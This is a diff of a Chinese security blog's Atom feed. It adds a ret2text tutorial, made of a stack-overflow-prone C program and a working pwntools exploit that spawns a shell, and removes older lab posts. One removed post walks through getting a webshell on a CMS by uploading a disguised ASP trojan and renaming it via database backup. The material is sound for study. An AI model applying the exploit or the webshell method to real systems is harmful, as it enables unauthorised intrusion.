@@ -6,7 +6,7 @@
   <link href="https://0xchang.github.io/atom.xml" rel="self"/>
   
   <link href="https://0xchang.github.io/"/>
-  <updated>2022-12-26T06:19:39.052Z</updated>
+  <updated>2023-02-01T08:19:23.247Z</updated>
   <id>https://0xchang.github.io/</id>
   
   <author>
@@ -15,6 +15,58 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://0xchang.github.io/2023/02/01/3.PNG/"/>
+    <id>https://0xchang.github.io/2023/02/01/3.PNG/</id>
+    <published>2023-02-01T08:19:23.247Z</published>
+    <updated>2023-02-01T08:19:23.247Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://0xchang.github.io/2023/02/01/[1.PNG/"/>
+    <id>https://0xchang.github.io/2023/02/01/[1.PNG/</id>
+    <published>2023-02-01T08:18:15.053Z</published>
+    <updated>2023-02-01T08:18:15.053Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ret2text</title>
+    <link href="https://0xchang.github.io/2023/02/01/ret2text/"/>
+    <id>https://0xchang.github.io/2023/02/01/ret2text/</id>
+    <published>2023-02-01T07:18:10.000Z</published>
+    <updated>2023-02-01T08:19:59.612Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="机器环境"><a href="#机器环境" class="headerlink" title="机器环境"></a>机器环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc version 11.3.0 (Debian 11.3.0-5)</span><br><span class="line">debian11</span><br><span class="line">Linux 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><h3 id="test-c源码"><a href="#test-c源码" class="headerlink" title="test.c源码"></a>test.c源码</h3><ul><li>test.c<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_name</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">15</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(buf,input,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;ck&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">print_name(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>编译时注意关闭pie<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie test.c</span><br></pre></td></tr></table></figure></li><li>目录树<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── a.out</span><br><span class="line">└── test.c</span><br></pre></td></tr></table></figure><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3></li></ul><ol><li>利用pwntools查看文件保护信息<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"><span class="comment">#result</span></span><br><span class="line">[*] <span class="string">&#x27;/home/xxx/test/a.out&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure></li><li>使用ida打开a.out</li><li>进入print_name函数中，查看buf分配大小<img src="http://121.5.125.62/image/ret2text/1.PNG" alt="print_name">，dest的rbp大小为0x0f。</li><li>查看shell函数的地址<img src="http://121.5.125.62/image/ret2text/2.PNG" alt="shell">，shell函数的入口地址为0x040116。</li><li>Ubuntu18.04 64位 和 部分Ubuntu16.04 64位 调用system的时候，rsp的最低字节必须为0x00（栈以16字节对齐），否则无法运行system指令。要解决这个问题，只要将返回地址设置为跳过函数开头的push rbp就可以了。<br>根据以上信息就可以写exp了。</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#加载a.out文件</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进入程序</span></span><br><span class="line">p=elf.process()</span><br><span class="line"><span class="comment">#输出程序加载地址</span></span><br><span class="line">s=elf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(s))</span><br><span class="line"><span class="comment">#b&#x27;a&#x27;为任意字节即可(python3用b&#x27;a&#x27;，python2用&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#长度23由buf的rbp大小0x0f，64位rbp大小8字节，相加即可</span></span><br><span class="line"><span class="comment">#0x0401167是shell入口地址去除首位指令</span></span><br><span class="line"><span class="comment">#32位程序用p32()函数，64位程序用p64()函数</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">23</span>)+p64(<span class="number">0x0401167</span>))</span><br><span class="line"><span class="comment">#交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="http://121.5.125.62/image/ret2text/3.PNG" alt="res"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;机器环境&quot;&gt;&lt;a href=&quot;#机器环境&quot; class=&quot;headerlink&quot; title=&quot;机器环境&quot;&gt;&lt;/a&gt;机器环境&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
+      
+    
+    
+    
+    
+    <category term="pwn" scheme="https://0xchang.github.io/tags/pwn/"/>
+    
+    <category term="pwntools" scheme="https://0xchang.github.io/tags/pwntools/"/>
+    
+    <category term="ret2text" scheme="https://0xchang.github.io/tags/ret2text/"/>
+    
+  </entry>
   
   <entry>
     <title>平方求解欧拉</title>
@@ -442,85 +494,6 @@
     <category term="短信" scheme="https://0xchang.github.io/tags/%E7%9F%AD%E4%BF%A1/"/>
     
     <category term="欺诈" scheme="https://0xchang.github.io/tags/%E6%AC%BA%E8%AF%88/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码混淆</title>
-    <link href="https://0xchang.github.io/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
-    <id>https://0xchang.github.io/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</id>
-    <published>2021-12-27T09:11:46.000Z</published>
-    <updated>2022-10-13T03:08:37.343Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><p>目的：</p><ul><li>JAVA编程实现Android手机代码混淆，并使用反编译查看效果</li></ul><p>原理：</p><ul><li>代码混淆(Obfuscated code)亦称花指令，是保护APP常见技术之一，方法是将程序代码转换成一种功能上等价，但是难于阅读和理解的形式，本实验介绍使用代码混淆技术对抗静态分析。混淆就是对发布出去的程序进行重新组织和处理，使得处理后的代码与处理前代码完成相同的功能，而混淆后的代码很难被反编译，即使反编译成功也很难得出程序的真正语义。被混淆过的程序代码，仍然遵照原来的档案格式和指令集，执行结果也与混淆前一样，只是混淆器将代码中的所有变量、函数、类的名称变为简短的英文字母代号，在缺乏相应的函数名和程序注释的情况下，即使被反编译，也将难以阅读。同时混淆是不可逆的，在混淆的过程中一些不影响正常运行的信息将永久丢失，这些信息的丢失使程序变得更加难以理解。混淆器的作用不仅仅是保护代码，它也有精简编译后程序大小的作用。由于以上介绍的缩短变量和函数名以及丢失部分信息的原因，编译后jar文件体积大约能减少25% ，这对当前费用较贵的无线网络传输是有一定意义的。</li></ul><p>过程：</p><ul><li><p>打开Eclipse，依次按照New-Project的顺序点击，然后选择 Android Application Project，新建一个可以执行的工程<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092846142.png" alt="image-20211229092846142"></p></li><li><p>添加应用名称与项目名称（name为SimpleEdu23,第一个SDK选择API14，其余默认），其他设置默认选择<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092927117.png" alt="image-20211229092927117"></p></li><li><p>点击next<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093002017.png" alt="image-20211229093002017"></p></li><li><p>选择相应位置，点击next<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093028747.png" alt="image-20211229093028747"></p></li><li><p>选择Blank Activity，点击next<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093051916.png" alt="image-20211229093051916"></p></li><li><p>输入Activity名称等信息，点击finish<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093159974.png" alt="image-20211229093159974"></p></li><li><p>打开android工程的project.properties文件<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093358762.png" alt="image-20211229093358762"></p></li><li><p>在project.properties文件中增加下面一行代码proguard.config=prouard-project.txt<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093451991.png" alt="image-20211229093451991"></p></li><li><p>项目在<a href="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E4%B8%AD%E5%A6%82%E6%9E%9C%E5%BC%95%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%B7%B7%E6%B7%86%E7%9A%84%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A0%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E5%A3%B0%E6%98%8E%EF%BC%8C%E9%83%A8%E5%88%86%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E8%99%BD%E7%84%B6%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC%E4%B8%AD%E8%BF%9B%E8%A1%8C%E4%BA%86%E5%A3%B0%E6%98%8E%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%BB%8F%E5%B8%B8%E4%BC%9A%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E7%B1%BB%E6%88%96%E8%80%85%E5%BC%95%E7%94%A8%E6%96%87%E4%BB%B6%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E7%8E%B0%E8%B1%A1%EF%BC%8C%E8%BF%99%E7%A7%8D%E7%8E%B0%E8%B1%A1%E5%9C%A8android-support-v4.jar%E4%B8%AD%E6%9B%B4%E4%B8%BA%E5%B8%B8%E8%A7%81![image-20211229093615763](http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)">http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/中如果引入第三方jar包，需要在混淆的脚本文件中加入第三方jar包声明，部分第三方jar包虽然在混淆脚本中进行了声明，但是在混淆过程中经常会发现内部类或者引用文件找不到的现象，这种现象在android-support-v4.jar中更为常见![image-20211229093615763](http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)</a></p></li><li><p>在proguard-project.txt添加以下代码</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-libraryjars ./libs/android-support-v4.jar</span><br><span class="line">-downwarn android.support.v4.**</span><br><span class="line">-downwarn **CompatHoneycomb</span><br><span class="line">-downwarn **CompatHoneycombMR2</span><br><span class="line">-downwarn **CompatCreatorHoneycombMR2</span><br><span class="line">-keep <span class="class"><span class="keyword">interface</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.<span class="title">app</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span></span><br><span class="line"><span class="class">-<span class="title">keep</span> <span class="title">public</span> <span class="title">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Fragment</span></span></span><br></pre></td></tr></table></figure><ul><li><p>点击file，选择export<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094244824.png" alt="image-20211229094244824"></p></li><li><p>选择export android application<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094303845.png" alt="image-20211229094303845"></p></li><li><p>点击next<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094340365.png" alt="image-20211229094340365"></p></li><li><p>生成证书加密（点击browse选择路径），本实验所有密码为123456<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094428828.png" alt="image-20211229094428828"></p></li><li><p>选择Alias并输入密码，点击next<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094501941.png" alt="image-20211229094501941"></p></li><li><p>点击browse选择生成的APK保存路径<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094535011.png" alt="image-20211229094535011"></p></li><li><p>使用JD-GUI<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095219086.png" alt="image-20211229095219086"></p></li><li><p>用解压缩工具解压simpleedu23.apk，得到classes.dex<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095342782.png" alt="image-20211229095342782"></p></li><li><p>将classes.dex与dex2jar放在同一目录<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095427029.png" alt="image-20211229095427029"></p></li><li><p>Cmd执行指令d2j-dex2jar.bat classes.dex<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095743092.png" alt="image-20211229095743092"></p></li><li><p>在dex2jar目录下获得目标程序的源代码<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095802525.png" alt="image-20211229095802525"></p></li><li><p>用jd-gui打开jar包，得到反编译后的源代码<img src="http://121.5.125.62/image/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095848546.png" alt="image-20211229095848546"></p></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;代码混淆&quot;&gt;&lt;a href=&quot;#代码混淆&quot; class=&quot;headerlink&quot; title=&quot;代码混淆&quot;&gt;&lt;/a&gt;代码混淆&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;JAVA编程实现Android手机代码混淆，并使用反编译查看效果&lt;/li&gt;
-&lt;/ul&gt;
-&lt;</summary>
-      
-    
-    
-    
-    
-    <category term="代码混淆" scheme="https://0xchang.github.io/tags/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>APP加壳</title>
-    <link href="https://0xchang.github.io/2021/12/27/APP%E5%8A%A0%E5%A3%B3/"/>
-    <id>https://0xchang.github.io/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</id>
-    <published>2021-12-27T08:40:29.000Z</published>
-    <updated>2022-10-13T03:08:37.281Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p><ul><li>熟悉常用Android编译工具的使用</li></ul><p>原理：</p><ul><li><p>APP加壳是在二进制的程序中植入一段代码，在程序的外面再包裹上一段代码，在运行的时候优先取得程序的控制权，保护里面的代码不被非法修改或反编译。</p></li><li><p>AndroidDex文件加壳涉及到三个程序：①加壳程序：对源Apk进行加密和脱壳项目的Dex的合并；②脱壳程序：解密壳数据；③源程序：需要加壳处理的被保护代码。</p></li><li><p>APP加壳的优势在于保护核心代码,提高破解的难度,还可以缓解代码注注入攻击。缺点是影响程序的运行效率。</p></li></ul><p>过程：</p><p>导入项目ForceApkObj,点击源程序项目。<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085141078.png" alt="image-20211229085141078"></p><p>右键项目，选择<code>Android Tools</code>,<code>Export Signed Application Package</code><img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085259329.png" alt="image-20211229085259329"></p><p>默认，点击next<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085322221.png" alt="image-20211229085322221"></p><p>选择<code>create keystore</code>,点击browse选择目录，密码随便设（123456），填完参数点击next<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085707268.png" alt="image-20211229085707268"></p><p>创建密钥信息（SimpleEdu11;123456;123456;100;SimpleEdu），点击next<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085847492.png" alt="image-20211229085847492"></p><p>选择APK生成位置，点击Browse，默认为SimpleEdu11<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085932751.png" alt="image-20211229085932751"></p><p>点击finish完成操作<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229085956125.png" alt="image-20211229085956125"></p><p>成功生成源程序APK文件<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229090057678.png" alt="image-20211229090057678"></p><p>右击脱壳程序项目ReforceApk，点击<code>Android Tools</code>，<code>Export UnSigned Application Package</code><img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229090206565.png" alt="image-20211229090206565"></p><p>接下来的步骤和源程序相同，生成脱壳程序APK<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229090304049.png" alt="image-20211229090304049"></p><p>右击脱壳程序apk，解压到…，得到解压文件</p><p>修改dex文件的名称为ForceApkObj.dex<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229091116540.png" alt="image-20211229091116540"></p><p>将FoceApkOBj.dex文件与ForceApkObj.apk文件放在C:\AndroidSec\SimpleEdu11\DexShellTools\force，如下为加壳程序的代码，它的作用是将源程序APK和脱壳程序dex文件合成新的dex文件<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229091826511.png" alt="image-20211229091826511"></p><p>点击按键<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229091948817.png" alt="image-20211229091948817"></p><p>选择<code>Debug As</code>，<code>2</code><img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092002112.png" alt="image-20211229092002112"></p><p>成功运行<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092026132.png" alt="image-20211229092026132"></p><p>按照导入的文件路径，找到生成的dex文件<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092046674.png" alt="image-20211229092046674"></p><p>右击脱壳程序，用压缩工具打开<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092237838.png" alt="image-20211229092237838"></p><p>将class文件替换脱壳程序中的dex文件<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092303091.png" alt="image-20211229092303091"></p><p>重新签名，将之前替换好的APK放入<code>APK重签名</code>文件中<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092406804.png" alt="image-20211229092406804"></p><p>双击签名程序后生成NewApk.apk<img src="http://121.5.125.62/image/APP%E5%8A%A0%E5%A3%B3/image-20211229092513149.png" alt="image-20211229092513149"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;APP加壳&quot;&gt;&lt;a href=&quot;#APP加壳&quot; class=&quot;headerlink&quot; title=&quot;APP加壳&quot;&gt;&lt;/a&gt;APP加壳&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;熟悉常用Android编译工具的使用&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;原理：&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    
-    <category term="APP" scheme="https://0xchang.github.io/tags/APP/"/>
-    
-    <category term="加壳" scheme="https://0xchang.github.io/tags/%E5%8A%A0%E5%A3%B3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>南方企业内容管理系统漏洞</title>
-    <link href="https://0xchang.github.io/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://0xchang.github.io/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</id>
-    <published>2021-12-27T08:00:51.000Z</published>
-    <updated>2022-10-13T03:19:02.073Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p>目的：</p><ul><li>熟悉南方数据企业网站管理系统</li><li>学习南方数据企业网站管理系统常见渗透手法</li></ul><p>原理：</p><ul><li>数据库备份拿webshell</li></ul><p>过程：</p><ul><li><p>浏览器输入<code>http://192.168.1.3:8002/admin/Login.asp</code>,进入后台<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png" alt="image-20211229083557740"></p></li><li><p>输入admin和密码123456,进入到后台管理界面<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083647733.png" alt="image-20211229083647733"></p></li><li><p>在荣誉管理选项卡下，选择添加企业荣誉，即可弹出可上传文件页面<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083914421.png" alt="image-20211229083914421"></p></li><li><p>点击浏览上传木马文件，把1.asp修改为1.jpg，点击上传<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084027790.png" alt="image-20211229084027790"></p></li><li><p>得到文件地址UploadFiles/xxxxxxxxxxxxx.jpg<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084137287.png" alt="image-20211229084137287"></p></li><li><p>打开系统管理下的数据库备份，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径，并填写数据库备份名称ok.asp<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084434435.png" alt="image-20211229084434435"></p></li><li><p>点击确定，即可得到数据库备份的路径admin/Databackup/ok.asp.asa<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084504206.png" alt="image-20211229084504206"></p></li><li><p>在火狐浏览器输入<code>http://192.168.1.3:8002/admin/Databackup/ok.asp</code>,即可访问木马，已经成功拿到webshell（密码：123456）<img src="http://121.5.125.62/image/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png" alt="image-20211229084709207"></p></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;南方企业内容管理系统漏洞&quot;&gt;&lt;a href=&quot;#南方企业内容管理系统漏洞&quot; class=&quot;headerlink&quot; title=&quot;南方企业内容管理系统漏洞&quot;&gt;&lt;/a&gt;南方企业内容管理系统漏洞&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;熟悉南方数据企业网站管理系</summary>
-      
-    
-    
-    
-    
-    <category term="南方企业" scheme="https://0xchang.github.io/tags/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A/"/>
     
   </entry>
   
